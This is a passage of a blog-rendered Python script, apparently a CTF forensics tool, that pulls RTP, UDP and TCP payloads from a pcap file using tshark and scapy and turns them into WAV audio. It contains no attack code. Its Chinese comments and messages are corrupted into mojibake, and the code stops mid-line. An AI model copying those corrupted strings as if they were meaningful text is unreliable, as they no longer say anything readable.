class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">import</span> glob</span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> wave</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> scipy <span class="keyword">import</span> signal</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PCAPAudioExtractor</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, enhance_audio=<span class="literal">True</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.temp_dir = tempfile.mkdtemp()</span><br><span class="line">        <span class="variable language_">self</span>.extracted_files = []</span><br><span class="line">        <span class="variable language_">self</span>.enhance_audio = enhance_audio</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># ç¡¬ç¼–ç  tshark è·¯å¾„</span></span><br><span class="line">        <span class="variable language_">self</span>.tshark_paths = [</span><br><span class="line">            <span class="string">r&quot;D:\\study\\ctf\\misc\\tool\\Wireshark\\Wireshark\\tshark.exe&quot;</span></span><br><span class="line">        ]</span><br><span class="line">        <span class="variable language_">self</span>.tshark_path = <span class="variable language_">self</span>._find_tshark()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># æ£€æŸ¥éŸ³é¢‘å¢å¼ºä¾èµ–</span></span><br><span class="line">        <span class="keyword">if</span> enhance_audio:</span><br><span class="line">            <span class="variable language_">self</span>._check_enhance_dependencies()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_find_tshark</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;æŸ¥æ‰¾ tshark å¯æ‰§è¡Œæ–‡ä»¶&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> path <span class="keyword">in</span> <span class="variable language_">self</span>.tshark_paths:</span><br><span class="line">            <span class="keyword">if</span> os.path.exists(path):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;æ‰¾åˆ° tshark: <span class="subst">&#123;path&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> path</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;è­¦å‘Š: æœªæ‰¾åˆ° tsharkï¼Œå°†è·³è¿‡ RTP æµæå–&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_check_enhance_dependencies</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;æ£€æŸ¥éŸ³é¢‘å¢å¼ºæ‰€éœ€çš„ä¾èµ–&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">            <span class="keyword">from</span> scipy <span class="keyword">import</span> signal</span><br><span class="line">            <span class="variable language_">self</span>.have_enhance_deps = <span class="literal">True</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;éŸ³é¢‘å¢å¼ºä¾èµ–å·²å®‰è£…&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> ImportError <span class="keyword">as</span> e:</span><br><span class="line">            <span class="variable language_">self</span>.have_enhance_deps = <span class="literal">False</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;è­¦å‘Š: éŸ³é¢‘å¢å¼ºä¾èµ–æœªå®‰è£…: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;å°†è·³è¿‡éŸ³é¢‘å¢å¼ºæ­¥éª¤&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__del__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># æ¸…ç†ä¸´æ—¶æ–‡ä»¶</span></span><br><span class="line">        <span class="keyword">for</span> f <span class="keyword">in</span> glob.glob(os.path.join(<span class="variable language_">self</span>.temp_dir, <span class="string">&quot;*&quot;</span>)):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                os.remove(f)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            os.rmdir(<span class="variable language_">self</span>.temp_dir)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">extract_all_audio</span>(<span class="params">self, pcap_file, output_dir=<span class="string">&quot;extracted_audio&quot;</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        å…¨è‡ªåŠ¨æå–pcapæ–‡ä»¶ä¸­çš„æ‰€æœ‰éŸ³é¢‘</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;å¼€å§‹åˆ†æpcapæ–‡ä»¶: <span class="subst">&#123;pcap_file&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># åˆ›å»ºè¾“å‡ºç›®å½•</span></span><br><span class="line">        os.makedirs(output_dir, exist_ok=<span class="literal">True</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># æ–¹æ³•1: å°è¯•æå–RTPéŸ³é¢‘æµ</span></span><br><span class="line">        rtp_files = <span class="variable language_">self</span>._extract_rtp_audio(pcap_file, output_dir)</span><br><span class="line">        <span class="variable language_">self</span>.extracted_files.extend(rtp_files)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># æ–¹æ³•2: å°è¯•æå–UDPéŸ³é¢‘æµ</span></span><br><span class="line">        udp_files = <span class="variable language_">self</span>._extract_udp_audio(pcap_file, output_dir)</span><br><span class="line">        <span class="variable language_">self</span>.extracted_files.extend(udp_files)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># æ–¹æ³•3: å°è¯•æå–TCPéŸ³é¢‘æµ</span></span><br><span class="line">        tcp_files = <span class="variable language_">self</span>._extract_tcp_audio(pcap_file, output_dir)</span><br><span class="line">        <span class="variable language_">self</span>.extracted_files.extend(tcp_files)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># æ–¹æ³•4: å°è¯•æå–åŸå§‹éŸ³é¢‘æ•°æ®</span></span><br><span class="line">        raw_files = <span class="variable language_">self</span>._extract_raw_audio(pcap_file, output_dir)</span><br><span class="line">        <span class="variable language_">self</span>.extracted_files.extend(raw_files)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># éŸ³é¢‘å¢å¼º</span></span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.enhance_audio <span class="keyword">and</span> <span class="variable language_">self</span>.have_enhance_deps <span class="keyword">and</span> <span class="variable language_">self</span>.extracted_files:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\n=== å¼€å§‹éŸ³é¢‘å¢å¼º ===&quot;</span>)</span><br><span class="line">            enhanced_files = <span class="variable language_">self</span>._enhance_all_audio(output_dir)</span><br><span class="line">            <span class="variable language_">self</span>.extracted_files.extend(enhanced_files)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># æ€»ç»“ç»“æœ</span></span><br><span class="line">        <span class="variable language_">self</span>._print_summary()</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.extracted_files</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_extract_rtp_audio</span>(<span class="params">self, pcap_file, output_dir</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;æå–RTPéŸ³é¢‘æµ&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n=== å°è¯•æå–RTPéŸ³é¢‘æµ ===&quot;</span>)</span><br><span class="line">        extracted_files = []</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># æ£€æŸ¥æ˜¯å¦æœ‰tsharkå¯ç”¨</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="variable language_">self</span>.tshark_path:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;æœªæ‰¾åˆ°tsharkï¼Œè·³è¿‡RTPæå–&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> extracted_files</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># è·å–æ‰€æœ‰RTPæµ</span></span><br><span class="line">            cmd = [<span class="variable language_">self</span>.tshark_path, <span class="string">&#x27;-r&#x27;</span>, pcap_file, <span class="string">&#x27;-Y&#x27;</span>, <span class="string">&#x27;rtp&#x27;</span>, <span class="string">&#x27;-T&#x27;</span>, <span class="string">&#x27;fields&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>, <span class="string">&#x27;rtp.ssrc&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>, <span class="string">&#x27;udp.dstport&#x27;</span>]</span><br><span class="line">            result = subprocess.run(cmd, capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> result.returncode != <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;tsharkæ‰§è¡Œå¤±è´¥&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> extracted_files</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># è§£æRTPæµ</span></span><br><span class="line">            streams = &#123;&#125;</span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> result.stdout.split(<span class="string">&#x27;\n&#x27;</span>):</span><br><span class="line">                <span class="keyword">if</span> line.strip():</span><br><span class="line">                    parts = line.split(<span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">len</span>(parts) &gt;= <span class="number">2</span>:</span><br><span class="line">                        ssrc, port = parts[<span class="number">0</span>], parts[<span class="number">1</span>]</span><br><span class="line">                        <span class="keyword">if</span> ssrc <span class="keyword">and</span> port:</span><br><span class="line">                            streams[ssrc] = port</span><br><span class="line">            </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;å‘ç° <span class="subst">&#123;<span class="built_in">len</span>(streams)&#125;</span> ä¸ªRTPæµ&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># æå–æ¯ä¸ªRTPæµ</span></span><br><span class="line">            <span class="keyword">for</span> i, (ssrc, port) <span class="keyword">in</span> <span class="built_in">enumerate</span>(streams.items()):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;å¤„ç†RTPæµ <span class="subst">&#123;i+<span class="number">1</span>&#125;</span>: SSRC=<span class="subst">&#123;ssrc&#125;</span>, ç«¯å£=<span class="subst">&#123;port&#125;</span>&quot;</span>)</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># æå–RTPè½½è·</span></span><br><span class="line">                raw_file = os.path.join(<span class="variable language_">self</span>.temp_dir, <span class="string">f&quot;rtp_<span class="subst">&#123;ssrc&#125;</span>.raw&quot;</span>)</span><br><span class="line">                cmd = [<span class="variable language_">self</span>.tshark_path, <span class="string">&#x27;-r&#x27;</span>, pcap_file, <span class="string">&#x27;-Y&#x27;</span>, <span class="string">f&#x27;rtp.ssrc==<span class="subst">&#123;ssrc&#125;</span>&#x27;</span>, <span class="string">&#x27;-T&#x27;</span>, <span class="string">&#x27;fields&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>, <span class="string">&#x27;rtp.payload&#x27;</span>]</span><br><span class="line">                result = subprocess.run(cmd, capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>)</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> result.returncode == <span class="number">0</span> <span class="keyword">and</span> result.stdout.strip():</span><br><span class="line">                    <span class="comment"># å¤„ç†åå…­è¿›åˆ¶è½½è·</span></span><br><span class="line">                    hex_data = result.stdout.replace(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        raw_data = <span class="built_in">bytes</span>.fromhex(hex_data)</span><br><span class="line">                        <span class="keyword">with</span> <span class="built_in">open</span>(raw_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                            f.write(raw_data)</span><br><span class="line">                        </span><br><span class="line">                        <span class="comment"># å°è¯•è½¬æ¢ä¸ºWAV</span></span><br><span class="line">                        wav_files = <span class="variable language_">self</span>._try_convert_to_wav(raw_file, output_dir, <span class="string">f&quot;rtp_stream_<span class="subst">&#123;i+<span class="number">1</span>&#125;</span>&quot;</span>)</span><br><span class="line">                        extracted_files.extend(wav_files)</span><br><span class="line">                    <span class="keyword">except</span> ValueError <span class="keyword">as</span> e:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;å¤„ç†RTPè½½è·å¤±è´¥: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;æå–RTPæµæ—¶å‡ºé”™: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> extracted_files</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_extract_udp_audio</span>(<span class="params">self, pcap_file, output_dir</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;æå–UDPéŸ³é¢‘æµ&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n=== å°è¯•æå–UDPéŸ³é¢‘æµ ===&quot;</span>)</span><br><span class="line">        extracted_files = []</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># ä½¿ç”¨scapyè¯»å–pcapæ–‡ä»¶</span></span><br><span class="line">            packets = rdpcap(pcap_file)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># æŒ‰UDPç«¯å£åˆ†ç»„</span></span><br><span class="line">            udp_streams = &#123;&#125;</span><br><span class="line">            <span class="keyword">for</span> packet <span class="keyword">in</span> packets:</span><br><span class="line">                <span class="keyword">if</span> packet.haslayer(UDP):</span><br><span class="line">                    udp = packet[UDP]</span><br><span class="line">                    port = udp.dport</span><br><span class="line">                    </span><br><span class="line">                    <span class="keyword">if</span> port <span class="keyword">not</span> <span class="keyword">in</span> udp_streams:</span><br><span class="line">                        udp_streams[port] = []</span><br><span class="line">                    </span><br><span class="line">                    <span class="comment"># è·å–UDPè½½è·</span></span><br><span class="line">                    payload = <span class="built_in">bytes</span>(udp.payload)</span><br><span class="line">                    <span class="keyword">if</span> payload:</span><br><span class="line">                        udp_streams[port].append(payload)</span><br><span class="line">            </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;å‘ç° <span class="subst">&#123;<span class="built_in">len</span>(udp_streams)&#125;</span> ä¸ªUDPç«¯å£&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># å¤„ç†æ¯ä¸ªUDPæµ</span></span><br><span class="line">            <span class="keyword">for</span> i, (port, payloads) <span class="keyword">in</span> <span class="built_in">enumerate</span>(udp_streams.items()):</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(payloads) &lt; <span class="number">10</span>:  <span class="comment"># å¤ªå°‘çš„åŒ…å¯èƒ½ä¸æ˜¯éŸ³é¢‘æµ</span></span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                    </span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;å¤„ç†UDPç«¯å£ <span class="subst">&#123;port&#125;</span>: <span class="subst">&#123;<span class="built_in">len</span>(payloads)&#125;</span> ä¸ªæ•°æ®åŒ…&quot;</span>)</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># åˆå¹¶è½½è·</span></span><br><span class="line">                raw_data = <span class="string">b&#x27;&#x27;</span>.join(payloads)</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># ä¿å­˜åŸå§‹æ•°æ®</span></span><br><span class="line">                raw_file = os.path.join(<span class="variable language_">self</span>.temp_dir, <span class="string">f&quot;udp_<span class="subst">&#123;port&#125;</span>.raw&quot;</span>)</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(raw_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.write(raw_data)</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># å°è¯•è½¬æ¢ä¸ºWAV</span></span><br><span class="line">                wav_files = <span class="variable language_">self</span>._try_convert_to_wav(raw_file, output_dir, <span class="string">f&quot;udp_port_<span class="subst">&#123;port&#125;</span>&quot;</span>)</span><br><span class="line">                extracted_files.extend(wav_files)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;æå–UDPæµæ—¶å‡ºé”™: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> extracted_files</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_extract_tcp_audio</span>(<span class="params">self, pcap_file, output_dir</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;æå–TCPéŸ³é¢‘æµ&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n=== å°è¯•æå–TCPéŸ³é¢‘æµ ===&quot;</span>)</span><br><span class="line">        extracted_files = []</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># ä½¿ç”¨scapyè¯»å–pcapæ–‡ä»¶</span></span><br><span class="line">            packets = rdpcap(pcap_file)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># æŒ‰TCPæµåˆ†ç»„</span></span><br><span class="line">            tcp_streams = &#123;&#125;</span><br><span class="line">            <span class="keyword">for</span> packet <span class="keyword">in</span> packets:</span><br><span class="line">                <span class="keyword">if</span> packet.haslayer(TCP) <span class="keyword">and</span> packet.haslayer(Raw):</span><br><span class="line">                    tcp = packet[TCP]</span><br><span class="line">                    stream_key = <span class="string">f&quot;<span class="subst">&#123;packet[IP].src&#125;</span>:<span class="subst">&#123;packet[IP].dst&#125;</span>:<span class="subst">&#123;tcp.sport&#125;</span>:<span class="subst">&#123;tcp.dport&#125;</span>&quot;</span></span><br><span class="line">                    </span><br><span class="line">                    <span class="keyword">if</span> stream_key <span class="keyword">not</span> <span class="keyword">in</span> tcp_streams:</span><br><span class="line">                        tcp_streams[stream_key] = []</span><br><span class="line">                    </span><br><span class="line">                    <span class="comment"># è·å–TCPè½½è·</span></span><br><span class="line">                    payload = <span class="built_in">bytes</span>(tcp.payload)</span><br><span class="line">                    <span class="keyword">if</span> payload:</span><br><span class="line">                        tcp_streams[stream_key].append(payload)</span><br><span class="line">            </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;å‘ç° <span class="subst">&#123;<span 